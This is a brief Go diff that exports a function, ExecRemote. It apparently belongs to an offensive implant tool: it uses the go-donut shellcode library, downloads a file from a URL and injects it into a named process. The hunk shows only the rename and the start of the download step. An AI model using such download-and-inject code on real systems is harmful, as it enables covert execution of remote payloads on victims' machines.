@@ -12,7 +12,7 @@ import (
 	"github.com/Binject/go-donut/donut"
 )
 
-func execRemote(url, fileType, argline, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
+func ExecRemote(url, fileType, argline, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
 	log.Infof("Executing from url %s with argument %s into %s",
 		url, argline, injectInto)
 	fileContent, err := DownloadFile(url)
